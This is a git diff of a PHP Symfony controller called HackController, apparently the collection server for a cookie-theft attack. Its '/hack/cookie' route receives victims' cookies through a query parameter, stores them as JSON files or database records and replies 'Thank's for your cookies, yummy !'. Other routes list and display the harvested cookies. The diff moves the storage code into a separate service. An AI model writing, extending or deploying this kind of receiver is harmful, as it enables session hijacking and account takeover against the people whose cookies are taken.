@@ -4,6 +4,7 @@ namespace App\Controller;
 
 use App\Entity\CookieRecord;
 use App\Repository\CookieRecordRepository;
+use App\Services\CookieWorkerService;
 use DateTimeImmutable;
 use DateTimeZone;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
@@ -15,26 +16,29 @@ class HackController extends AbstractController
 {
     CONST STORAGE_PATH = "../var/storage/";
     private CookieRecordRepository $cookieRecordRepository;
+    private CookieWorkerService $cookieWorkerService;
 
     /**
      * @param CookieRecordRepository $cookieRecordRepository
+     * @param CookieWorkerService $cookieWorkerService
      */
-    public function __construct(CookieRecordRepository $cookieRecordRepository)
+    public function __construct(CookieRecordRepository $cookieRecordRepository, CookieWorkerService $cookieWorkerService)
     {
         $this->cookieRecordRepository = $cookieRecordRepository;
+        $this->cookieWorkerService = $cookieWorkerService;
     }
 
     #[Route('/hack', name: 'app_hack')]
     public function index(): Response
     {
-        $cookieFileList = scandir(self::STORAGE_PATH);
+        $cookieFileList = scandir($_ENV["STORAGE_PATH"]);
         array_splice($cookieFileList,0,2);
         $cookieFiles = [];
         foreach($cookieFileList as $c){
             $cookieFiles[] = [
-                "createdAt"=>filectime(self::STORAGE_PATH.$c),
+                "createdAt"=>filectime($_ENV["STORAGE_PATH"].$c),
                 //"name"=>$c
-                "name"=>pathinfo(self::STORAGE_PATH.$c)["filename"]
+                "name"=>pathinfo($_ENV["STORAGE_PATH"].$c)["filename"]
             ];
         }
         return $this->render('hack/index.html.twig', [
@@ -66,7 +70,7 @@ class HackController extends AbstractController
     public function showCookieFileContent(string $filename): Response
     {
         $content = json_decode(file_get_contents(self::STORAGE_PATH."$filename.json"),true);
-        $createdAt = filectime(self::STORAGE_PATH."$filename.json");
+        $createdAt = filectime($_ENV["STORAGE_PATH"]."$filename.json");
         return $this->render('hack/show-cookie-file-content.html.twig', [
             "content"=>$content,
             "createdAt"=>$createdAt,
@@ -84,17 +88,10 @@ class HackController extends AbstractController
     #[Route('/hack/cookie', name: 'app_hack_cookies')]
     public function grabCookies(Request $request): Response
     {
-
         $message = "No cookie for me ... ok that's was just a test ...";
         if($request->query->get('cookie') && $request->query->get('output')){
-
-            $result = match($request->query->get('output')){
-                "text"=>$this->createTextFile($request->query->get('cookie')),
-                "store"=>$this->createRecord($request->query->get('cookie'))
-            };
-
+            $this->cookieWorkerService->proceedCookie($request->query->get('cookie'),$request->query->get('output'));
             $message = "Thank's for your cookies, yummy !";
-
         }
 
         return $this->render('hack/compromised.html.twig', [
@@ -102,32 +99,6 @@ class HackController extends AbstractController
         ]);
     }
 
-    private function formatCookie(string $cookie): array
-    {
-        $cookieArr = explode("; ",$cookie);
-        $cookieFinal = [];
 
-        foreach($cookieArr as $item){
-            $itemArr = explode("=",$item);
-            $cookieFinal[$itemArr[0]] = $itemArr[1];
-        }
-
-        return $cookieFinal;
-    }
-
-    private function createTextFile(string $cookie): bool
-    {
-        $timestamp = (new DateTimeImmutable('now',new DateTimeZone('Europe/Paris')))->getTimestamp();
-        file_put_contents(self::STORAGE_PATH."cookies-$timestamp.json", json_encode($this->formatCookie($cookie)));
-        return true;
-    }
-
-    private function createRecord(string $cookie): bool
-    {
-        $record = new CookieRecord($this->formatCookie($cookie));
-
-        $this->cookieRecordRepository->add($record,true);
-        return true;
-    }
 
 }
